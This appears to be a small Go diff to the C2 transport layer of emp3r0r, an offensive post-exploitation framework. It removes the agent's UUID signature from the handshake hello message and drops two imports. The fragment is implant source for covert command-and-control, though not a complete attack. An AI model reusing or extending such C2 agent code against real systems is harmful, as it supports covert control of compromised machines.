@@ -2,7 +2,6 @@ package c2transport
 
 import (
 	"context"
-	"encoding/base64"
 	"fmt"
 	"io"
 	"os"
@@ -16,7 +15,6 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
 	"github.com/google/uuid"
-	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/live"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
@@ -264,20 +262,10 @@ func MsgTunneler(conn io.ReadWriteCloser, config *def.Config, callback func(*def
 			hello_msg.CmdSlice = []string{util.RandStr(util.RandInt(1, 100))}
 			hello_msg.JobID = uuid.NewString()
 			hello_msg.Tag = config.AgentTag
-			hello_msg.AgentUUID = config.AgentUUID
 			hello_msg.Time = time.Now().Format("2006-01-02 15:04:05.999999999 -0700 MST")
 			if !handshakeDone {
 				hello_msg.EphemPublicKey = pubKeyBytes // Send our ephemeral public key
 			}
-
-			// Dynamic TOFU: Sign UUID with Agent Key for session authentication
-			sig, err := agentutils.SignWithAgentKey([]byte(config.AgentUUID))
-			if err != nil {
-				logging.Errorf("SignWithAgentKey: %v", err)
-				util.TakeABlink()
-				continue
-			}
-			hello_msg.AgentUUIDSig = base64.URLEncoding.EncodeToString(sig)
 
 			// Mark the hello as pending BEFORE writing it. In polling transports
 			// (http_poll) the server can reply before out.Encode returns, so
